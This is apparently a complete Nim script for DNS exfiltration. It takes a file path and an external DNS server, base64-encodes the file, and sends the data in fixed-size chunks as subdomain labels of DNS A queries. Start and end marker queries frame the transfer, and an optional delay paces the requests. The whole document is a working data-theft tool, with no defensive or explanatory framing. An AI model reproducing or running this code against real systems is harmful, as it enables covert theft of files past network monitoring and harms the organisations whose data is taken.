import dnsclient
import argparse
import std/base64


var p = newParser:
    option("-f", "--file", help="Target file to send")
    option("-s", "--server", help="External DNS server to send file to")
    option("-l", "--length", help="Number of characters to send with each request")
    option("-d", "--delay", help="Time to wait (in milliseconds) in between each request")


try:
    # Setup variables from arguments
    var opts = p.parse()
    let targetFile = opts.file
    let targetServer = opts.server
    var requestLength, delayTime: int

    if opts.length == "":
        requestLength = 20
    else:
        requestLength = parseInt(opts.length)
    
    if opts.delay == "":
        delayTime = 0
    else:
        delayTime = parseInt(opts.delay)

    # if isNil(requestLength):
    #     requestLength = 20
    # if isNil(delayTime):
    #     delayTime = 0


    # Define target domain and create DNSClient object
    let targetDomain = ".test.local"
    let client = newDNSClient(server=targetServer)

    # Check if given file is valid
    if not fileExists(targetFile):
        echo "[-] Error accessing target file!"
    
    # Get content of target file.
    # Nim treats strings as an array of characters already, so no need to get byte array
    var fileb64 = encode(readFile(targetFile))

    # Replace equals with a URL safe dash
    fileb64 = replace(fileb64, "=", "-")

    var totalRequests = int(len(fileb64)/requestLength+2)
    echo "\n[*] Sending a total of ", totalRequests, " DNS requests to ", targetServer
    
    # Remove any potential bad characters from file name
    var adjustedFileName = replace(replace(targetFile, ".", "-"), "\\", "")

    # Send start of file identifier
    var requestString = "11111" & adjustedFileName & "11111" & targetDomain
    var resp = client.sendQuery(requestString, A)

    # Loop over Base64 data sending the specific number of characters per request
    for c in countup(0, len(fileb64), requestLength):
        try:
            requestString = fileb64[c ..< c+requestLength] & targetDomain
            resp = client.sendQuery(requestString, A)
            #echo fileb64[c ..< c+20]
        except:
            requestString = fileb64[c .. fileb64.high] & targetDomain
            resp = client.sendQuery(requestString, A)
            #echo fileb64[c .. fileb64.high]

        # Wait specified number of milliseconds between each request
        sleep(delayTime)

    # Send end of file identifier
    requestString = "000000000000000" & targetDomain
    resp = client.sendQuery(requestString, A)


    echo "\n[+] Successfully sent file '", targetFile, "' over a total of ", totalRequests, " to ", targetServer


   # For potential troubleshooting to ensure data is encoded correctly
    # var fileb64Decoded = decode(fileb64)
    # echo "Original: ", fileb64Decoded

except Exception:
    echo getCurrentExceptionMsg()

